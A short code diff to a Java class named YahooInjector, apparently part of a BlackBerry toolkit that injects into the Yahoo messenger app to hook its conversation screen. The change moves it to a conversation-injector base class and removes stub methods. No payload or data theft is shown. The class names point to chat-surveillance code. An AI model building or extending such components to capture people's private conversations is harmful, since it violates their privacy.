@@ -1,10 +1,9 @@
 package blackberry.injection.injectors;
 
-import net.rim.device.api.ui.Screen;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-public class YahooInjector extends AInjector {
+public class YahooInjector extends AConversationInjector {
     //#ifdef DEBUG
     private static Debug debug = new Debug("YahooInjector", DebugLevel.VERBOSE);
     //#endif
@@ -17,15 +16,6 @@ public class YahooInjector extends AInjector {
         return "net_rim_bb_qm_yahoo";
     }
 
-    public String[] getWantedScreen() {
 
-        return new String[] { "ConversationScreen" };
-    }
-
-    public void playOnScreen(Screen screen) {
-        //#ifdef DEBUG
-        debug.trace("playOnScreen");
-        //#endif
-    }
 
 }
